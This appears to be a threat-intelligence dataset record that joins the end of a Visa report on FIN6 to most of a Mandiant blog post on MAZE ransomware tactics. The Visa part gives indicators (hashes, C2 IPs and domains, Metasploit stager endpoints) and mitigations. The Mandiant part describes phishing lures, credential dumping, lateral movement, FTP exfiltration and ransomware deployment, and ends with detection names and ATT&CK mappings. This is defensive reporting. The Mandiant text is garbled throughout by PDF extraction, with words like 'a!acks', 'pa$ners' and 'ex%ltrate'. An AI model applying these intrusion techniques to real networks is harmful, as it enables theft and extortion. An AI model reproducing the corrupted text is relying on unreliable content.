e1bf80ef5fb111b087b8c172a38c0b23 More_Eggs (aka Terra Loader) Malware (Bot Version - 3.0) b4dcb80246769a6b291a4c7e98a380bd More_Eggs (aka Terra Loader) Malware e526722fdd276e56fdd932f3d0e72cbb TeamViewer Component cbf0d3faef2e51798ef838a238855bdf TeamViewer Component 388e3854f7ceb64b0c931eeceab29295 TeamViewer Component bdd2c72c1fcf7712cd66b98cf0f1cc18 4376a330323789c6cc1591bbe737ff7e Metasploit Shellcode Loader 94.130.52[.]230:443 Stealer One (aka SONE or InfoStealer) Malware PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption Encoded PowerShell Commands Visa analyzed a number of encoded PowerShell commands identified in recent FIN6 activity and determined the majority are related to Metasploit activity, including: Metasploit Bind TCP Stager (different local ports were observed) Metasploit Reverse TCP Stager – 46.4.113[.]237:443 Metasploit Reverse HTTPS Stager – 185.154.52[.]140:443 Network IOCs Malicious C2 IPs 185.180.198[.]110:443 46.4.113[.]237:443 185.154.52[.]140:443 94.130.52[.]230:443 185.159.82[.]78:443 Malicious C2 Domains static.akamaitechnologies[.]kz contactlistsagregator[.]com teamviewer[.]com onlinemail[.]kz Malicious HTTPS Activity hxxps://static.akamaitechnologies[.]kz/sonemone/version.php hxxps://contactlistsagregator[.]com/j2378745678674623/ajax.php hxxps://onlinemail[.]kz/apison215/version.php PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption More_Eggs Network IOCs In addition to the C2 information provided, which can change, below are some network IOCs that can be used to detect More_Eggs beaconing out of the network: 0BConnectivity Check The malware checks network connectivity by sending an HTTP HEAD (GET in some new versions) request to the following legitimate URL: • hxxp://www[.]w3[.]org/1999/XSL/Format 1BSleep Function The malware issues an HTTP GET request to the following Google public DNS IP, which takes a few seconds to complete, causing the program to pause its activity temporarily. This is used as a method to avoid detection, by delaying further exploitation: • hxxp://8.8.8[.]8/<Random Path> • User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) Recommendations & Additional Resources Visa recommends clients take the following actions to mitigate against these threats: • Institute recurring checks in local networks for IOCs provided in this report. • Verify the implementation of required security patches: Payment Card Industry Data Security Standard (PCI DSS) requires that all system components and software are protected from known vulnerabilities by installing security patches. Visit the Payment Card Industry Security Standards Council (PCI SSC) website for more information. • Regularly scan and test eCommerce sites for vulnerabilities or malware. Hire a trusted professional or service provider with a reputation of security to secure the eCommerce environment. Ask questions and require a report of what was done. Trust, but verify the steps taken by the company you hire. • Consider using a fully-hosted checkout solution where customers enter their payment details on another webpage hosted by that checkout solution, separate from the merchant’s site. This is the most secure way to protect the merchant and their customers from eCommerce skimming malware. Hosted checkout forms embedded inline on the merchant’s checkout page, such as Visa Checkout, are another secure option. • Use a Payment Card Industry Data Security Standard (PCI DSS) validated third-party service provider to store, process or transmit cardholder data. Criminals commonly target merchant websites that process payment data. When merchants use a validated and secure service provider, risk exposure for CNP fraud and compromise decreases. A list of validated, registered service providers is available on the Global Registry of Service Providers. • Comply consistently with industry security standards, such as the Payment Card Industry Data Security Standard (PCI DSS), including the PCI Best Practices for Securing e-Commerce, January 2017. PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption • Set up a Web Application Firewall to block suspicious and malicious requests from reaching the website. There are options that are free, simple to use, and practical for small merchants. • Limit access to the administrative portal and accounts to those who need them. • Require strong administrative passwords (use a password manager for best results) and enable two-factor authentication. • Regularly ensure shopping cart, other services, and all software are upgraded or patched to the latest versions to keep attackers out. • Monitor for suspicious activity—create and regularly check logs and receive alerts if changes to the site are made. • Ensure staff are trained in security best practices and follow the designated procedures. If a merchant suspects a compromise, they should contact their acquiring bank immediately for guidance on next steps and to ensure compliance with all Visa investigation and compliance guidelines. For more information, refer to the What to Do If Compromised (WTDIC) guide. Additional Resources Visa eCommerce Malware Webinar Visa Merchant Library PCI Best Practices for Securing e-Commerce, January 2017 PCI How-to Guide for Incident Management PCI Data Security Standard Contact Information For more information, please contact paymentintelligence@visa.com To report a data breach, contact Visa Fraud Control: • Asia Pacific Region, Central Europe/Middle East/Africa Region: VIFraudControl@visa.com • • • U.S. and Canada: USFraudControl@visa.com Europe: Datacompromise@visa.com Latin America & Caribbean: LACFraudInvestigations@visa.com Disclaimer: This report is intended for informational purposes only and should not be relied upon for operational, marketing, legal, technical, tax, financial or other advice. Visa is not responsible for your use of the information contained in this report (including errors, omissions, or non-timeliness of any kind) or any assumptions or conclusions you may draw from it. Dissemination or redistribution of PFD products without express permission is strictly prohibited. PFD-18-024 Visa Public February 2019"
fin6,cti-hal,777fcafb9c15,G0037,"Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Cloud Blog Contact sales Get started for free Threat Intelligence Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents July 5, 2020 Mandiant Wri!en by: Jeremy Kennelly, Kimberly Goody, Joshua Shilko Targeted ransomware incidents have brought a threat of disruptive and destructive a!acks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents, FIN6 activity, implications for OT networks, and other aspects of post- https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 1 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in a!acks that combine targeted ransomware use, public exposure of victim data, and an a""liate model. Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shi#ing to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an exto$ion fee. The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations. Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 2 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 threat in a May 21 webinar. Victimology We are aware of more than 100 alleged MAZE victims repo$ed by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in No$h America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, %nancial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1). Figure 1: Geographical and industry distribution of alleged MAZE victims Multiple Actors Involved in MAZE Ransomware Operations Identi!ed Mandiant identi%ed multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking pa$ners to ful%ll di&erent functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers. A panel used to manage victims targeted for MAZE https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 3 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 ransomware deployment has a section for a""liate transactions. This activity is consistent with our assessment that MAZE operates under an a""liate model and is not distributed by a single group. Under this business model, ransomware developers will pa$ner with other actors (i.e. a""liates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct a""liates of MAZE ransomware also pa$ner with other actors who pe'orm speci%c tasks for a percentage of the ransom payment. This includes pa$ners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to pe'orm speci%c tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing e""ciency, while still allowing all pa$ies involved to pro%t. Figure 2: MAZE ransomware panel MAZE Initially Distributed via Exploit Kits and Spam Campaigns https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 4 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a signi%cant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document a!achments or inline links to documents which download and execute Maze ransomware. On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckersta!ung” and “1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladko&1991@yandex.ru. Figure 3: German-language lure https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 5 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload. On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and ""Your AT&T wireless bill is ready to view"" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019. Figure 4: AT&T email lure Figure 5: Canada Post email lure Shi"" to Post-Compromise Distribution Maximizes Impact https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 6 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Actors using MAZE have increasingly shi#ed to deploying the ransomware post-compromise. This methodology provides an oppo$unity to infect more hosts within a victim’s environment and ex%ltrate data, which is leveraged to apply additional pressure on organizations to pay exto$ion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data. Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest a!ribution to distinct teams. Even within these teams, the cyber criminals appear to be task- oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in di&erent phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months. Initial Compromise There are few clear pa!erns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting pa$ners https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 7 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 with network access. The following are a sample of observations from several Mandiant incident response engagements: A user downloaded a malicious resume- themed Microso# Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON. An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic suppo$ account. It is unclear how the actor obtained the account's password. An actor exploited a miscon%guration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network. An actor logged into a Citrix web po$al account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system. Establish Foothold & Maintain Presence The use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 8 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable la!er-stage operations. Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations. Web shells were deployed to an internet- facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor. Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations. An actor created a new domain account and added it to the domain administrators group. Escalate Privileges Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these e&o$s have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for %les containing credentials. Less than two weeks a#er initial access, the https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 9 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 actor downloaded and interacted with an archive named mimi.zip, which contained %les corresponding to the credential harvesting tool Mimikatz. In the following days the same mimi.zip archive was identi%ed on two domain controllers in the impacted environment. The actor a!empted to %nd %les with the word “password” within the environment. Additionally, several archive %les were also created with %le names suggestive of credential harvesting activity. The actor a!empted to identify hosts running the KeePass password safe so#ware. Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges. Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable a!ackers' e&o$s to understand the impacted organization's Active Directory con%guration. In this case the responsible actors also a!empted to ex%ltrate collected credentials to multiple di&erent cloud %le storage services. https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 10 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Reconnaissance Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks. In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, %lesystem, and domain related information. Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Ad%nd to suppo$ this stage of their operations. Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a %le named '2.txt'. The actor ex%ltrated reconnaissance command output data and documents related to the IT environment to an a!acker- https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 11 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 controlled FTP server via an encoded PowerShell script. Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts. An actor employed the ad%nd tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2ad%nd.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe. An actor used the tool smbtools.exe to assess whether accounts could login to systems across the environment. An actor collected directory listings from %le servers across an impacted environment. Evidence of data ex%ltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future ex%ltration. Lateral Movement Across the majority of MAZE ransomware incidents lateral movement was accomplished https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 12 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed. A!ackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation. The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts. An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account. At least one actor a!empted to pe'orm lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these a!empts were successful. Complete Mission https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 13 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 There was evidence suggesting data ex%ltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an exto$ion fee. An actor has been observed ex%ltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any %les with .7z %le extensions to a prede%ned FTP server using a hard-coded username and password. This script appears to be a slight variant of a script %rst posted to Microso# TechNet in 2013. A di&erent base64-encoded PowerShell command was also used to enable this functionality in a separate incident. Actors deploying MAZE ransomware have also used the utility WinSCP to ex%ltrate data to an a!acker-controlled FTP server. An actor has been observed employing a %le replication utility and copying the stolen data to a cloud %le hosting/sharing service. Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate %le shares. These archives were then ex%ltrated to an a!acker-controlled server via FTP using the WinSCP utility. https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 14 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 In addition to data the#, actors deploy MAZE ransomware to encrypt %les identi%ed on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands. Five days a#er data was ex%ltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a po$ion of these systems. A!ackers employed batch scripts and a series to txt %les containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment. An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion. Immediately following the ex%ltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows: A batch script named sta!.bat was used to execute a series of secondary batch scripts with names such as xaa3x.bat or xab3x.bat. https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 15 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environment Notably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted. Implications Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, pa$icularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our Ransomware Protection and Containment Strategies blog post and the linked white paper. Mandiant Security Validation Actions Organizations can validate their security https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 16 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 controls against more than 20 MAZE-speci%c actions with Mandiant Security Validation. Please see our Headline Release Content Updates – April 21, 2020 on the Mandiant Security Validation Customer Po$al for more information. A100-877 - Active Directory - BloodHound, CollectionMethod All A150-006 - Command and Control - BEACON, Check-in A101-030 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #1 A101-031 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #2 A101-032 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #3 A100-878 - Command and Control - MAZE Ransomware, C2 Check-in A100-887 - Command and Control - MAZE, DNS Query #1 A100-888 - Command and Control - MAZE, DNS Query #2 A100-889 - Command and Control - MAZE, DNS Query #3 A100-890 - Command and Control - MAZE, DNS Query #4 A100-891 - Command and Control - MAZE, DNS Query #5 A100-509 - Exploit Kit Activity - Fallout https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 17 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Exploit Kit CVE-2018-8174, Github PoC A100-339 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing Page A101-033 - Exploit Kit Activity - Spelevo Exploit Kit, MAZE C2 A100-208 - FTP-based Ex%l/Upload of PII Data (Various Compression) A104-488 - Host CLI - Collection, Ex%ltration: Active Directory Reconnaissance with SharpHound, CollectionMethod All A104-046 - Host CLI - Collection, Ex%ltration: Data from Local Drive using PowerShell A104-090 - Host CLI - Collection, Impact: Creation of a Volume Shadow Copy A104-489 - Host CLI - Collection: Privilege Escalation Check with PowerUp, Invoke- AllChecks A104-037 - Host CLI - Credential Access, Discovery: File & Directory Discovery A104-052 - Host CLI - Credential Access: Mimikatz A104-167 - Host CLI - Credential Access: Mimikatz (2.1.1) A104-490 - Host CLI - Defense Evasion, Discovery: Terminate Processes, Malware Analysis Tools A104-491 - Host CLI - Defense Evasion, Persistence: MAZE, Create Target.lnk https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 18 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 A104-500 - Host CLI - Discovery, Defense Evasion: Debugger Detection A104-492 - Host CLI - Discovery, Execution: Antivirus Query with WMI, PowerShell A104-374 - Host CLI - Discovery: Enumerate Active Directory Forests A104-493 - Host CLI - Discovery: Enumerate Network Shares A104-481 - Host CLI - Discovery: Language Query Using PowerShell, Current User A104-482 - Host CLI - Discovery: Language Query Using reg query A104-494 - Host CLI - Discovery: MAZE, Dropping Ransomware Note Burn Directory A104-495 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html Variant A104-496 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt Variant A104-027 - Host CLI - Discovery: Process Discovery A104-028 - Host CLI - Discovery: Process Discovery with PowerShell A104-029 - Host CLI - Discovery: Remote System Discovery A104-153 - Host CLI - Discovery: Security https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 19 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 So#ware Identi%cation with Tasklist A104-083 - Host CLI - Discovery: System Info A104-483 - Host CLI - Ex%ltration: PowerShell FTP Upload A104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware Message A104-227 - Host CLI - Initial Access, Lateral Movement: Replication Through Removable Media A100-879 - Malicious File Transfer - Ad%nd.exe, Download A150-046 - Malicious File Transfer - BEACON, Download A100-880 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp Executable Variant A100-881 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp PowerShell Variant A100-882 - Malicious File Transfer - Bloodhound Ingestor Download, PowerShell Variant A101-037 - Malicious File Transfer - MAZE Download, Variant #1 A101-038 - Malicious File Transfer - MAZE Download, Variant #2 A101-039 - Malicious File Transfer - MAZE Download, Variant #3 https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 20 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 A101-040 - Malicious File Transfer - MAZE Download, Variant #4 A101-041 - Malicious File Transfer - MAZE Download, Variant #5 A101-042 - Malicious File Transfer - MAZE Download, Variant #6 A101-043 - Malicious File Transfer - MAZE Download, Variant #7 A101-044 - Malicious File Transfer - MAZE Download, Variant #8 A101-045 - Malicious File Transfer - MAZE Download, Variant #9 A101-034 - Malicious File Transfer - MAZE Dropper Download, Variant #1 A101-035 - Malicious File Transfer - MAZE Dropper Download, Variant #2 A100-885 - Malicious File Transfer - MAZE Dropper Download, Variant #4 A101-036 - Malicious File Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script Download A100-284 - Malicious File Transfer - Mimikatz W/ Padding (1MB), Download A100-886 - Malicious File Transfer - Rclone.exe, Download A100-484 - Scanning Activity - Nmap smb- enum-shares, SMB Share Enumeration https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 21 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Detecting the Techniques Pla!orm Signature Name MVX (covers multiple FireEye technologies) Bale Detection FE_Ransomware_Win_MAZE_1 Endpoint Security Network Security WMIC SHADOWCOPY DELETE (METHODOLOGY) MAZE RANSOMWARE (FAMILY) Ransomware.Win.MAZE Ransomware.Maze Ransomware.Maze MITRE ATT&CK Mappings Mandiant currently tracks three separate clusters of activity involved in the post- compromise distribution of MAZE ransomware. Future data collection and analysis e&o$s may reveal additional groups involved in intrusion https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 22 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 activity suppo$ing MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s). MAZE Group 1 MITRE ATT&CK Mapping ATT&CK Tactic Category Initial Access Techniques T1133: External Remote Services T1078: Valid Accounts T1059: Command-Line Inte'ace Execution T1086: PowerShell T1064: Scripting T1035: Service Execution https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 23 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Persistence T1078: Valid Accounts T1050: New Service Privilege Escalation T1078: Valid Accounts Defense Evasion Credential Access T1078: Valid Accounts T1036: Masquerading T1027: Obfuscated Files or Information T1064: Scripting T1110: Brute Force T1003: Credential Dumping T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share Discovery Discovery T1069: Permission Groups https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 24 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Discovery T1018: Remote System Discovery T1016: System Network Con%guration Discovery T1076: Remote Desktop Protocol T1105: Remote File Copy Lateral Movement Collection T1005: Data from Local System T1043: Commonly Used Po$ T1105: Remote File Copy T1071: Standard Application Layer Protocol T1002: Data Compressed T1048: Ex%ltration Over Alternative Protocol T1486: Data Encrypted for Impact Command and Control Ex""ltration Impact https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 25 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 T1489: Service Stop MAZE Group 2 MITRE ATT&CK Mapping ATT&CK Tactic Category Techniques Initial Access T1193: Spearphishing A!achment Execution T1059: Command-Line Inte'ace T1086: PowerShell T1085: Rundll32 T1064: Scripting T1204: User Execution T1028: Windows Remote Management T1078: Valid Accounts Persistence T1050: New Service https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 26 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 T1136: Create Account Privilege Escalation T1078: Valid Accounts T1050: New Service Defense Evasion T1078: Valid Accounts T1140: Deobfuscate/Decode Files or Information T1107: File Deletion T1036: Masquerading T1003: Credential Dumping Credential Access T1081: Credentials in Files T1171: LLMNR/NBT-NS Poisoning T1087: Account Discovery T1482: Domain Trust Discovery T1083: File and Directory Discovery T1135: Network Share https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 27 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 Discovery Discovery T1069: Permission Groups Discovery T1018: Remote System Discovery T1033: System Owner/User Discovery T1076: Remote Desktop Protocol T1028: Windows Remote Management T1074: Data Staged T1005: Data from Local Lateral Movement Collection System T1039: Data from Network Shared Drive T1043: Commonly Used Po$ T1219: Remote Access Tools T1105: Remote File Copy Command and Control https://cloud.google.com/blog/topics/threat-intelligence/tactics-techniques-procedures-associated-with-maze-ransomware-incidents/ Pagina 28 di 47 Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Google Cloud Blog 21/06/24, 10:20 